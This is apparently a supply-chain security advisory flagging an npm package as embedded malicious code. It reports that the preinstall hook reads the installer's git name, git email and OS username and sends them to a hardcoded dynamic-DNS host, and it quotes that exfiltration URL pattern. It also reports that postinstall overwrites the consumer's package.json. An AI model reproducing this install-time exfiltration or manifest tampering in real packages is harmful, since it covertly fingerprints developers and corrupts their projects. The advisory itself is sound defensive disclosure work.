summary: preinstall script exfiltrates git identity and OS username to hardcoded third-party host
details: The package's preinstall lifecycle hook (package.json: "preinstall": "node./dist/scripts/preinstall.js") performs unconsented installer-side data exfiltration on every `npm install`. dist/scripts/preinstall.js reads the installer's `~/.gitconfig` via `iniparser.parseSync(home_dir+'/.gitconfig')`, reads `os.userInfo().username`, and issues an HTTPS GET to a hardcoded third-party host `https://2tak.l.serverhost.name:1962/mobile/reext?osname=<os>&gitname=<config.user.name>&gitemail=<config.user.email>`. The destination is not the package's documented publisher infrastructure — `l.serverhost.name` is a free-subdomain/dynamic-DNS host. The exfiltrated values (OS username + git user.name + git user.email) uniquely fingerprint the developer and their employer/corporate affiliation (especially in CI contexts), and are transmitted with no disclosure in the README and no opt-out. Additional quality concerns are present: postinstall.js resolves `../../package.json` from inside node_modules and destructively rewrites the consumer's top-level package.json, deleting `scripts`, `eslintConfig`, `devDependencies`, and `dependencies` — corrupting the consumer's manifest. preinstall also writes SDK assets into `../../../public/` outside the package's own install tree. These behaviors compound the supply-chain concern but the block basis is the identity exfiltration to a hardcoded non-publisher host at install time.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
